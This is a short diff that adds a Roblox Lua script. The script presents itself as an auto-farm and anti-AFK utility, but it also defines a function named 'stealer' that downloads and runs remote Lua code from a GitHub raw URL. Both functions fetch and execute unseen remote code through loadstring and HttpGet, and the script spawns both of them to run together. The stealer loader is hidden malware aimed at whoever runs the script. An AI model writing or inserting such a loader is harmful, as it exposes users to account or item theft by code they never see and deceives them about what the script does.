@@ -1,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/6ec2aea6daebab2ce562d735.lua'))()
+end
+
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
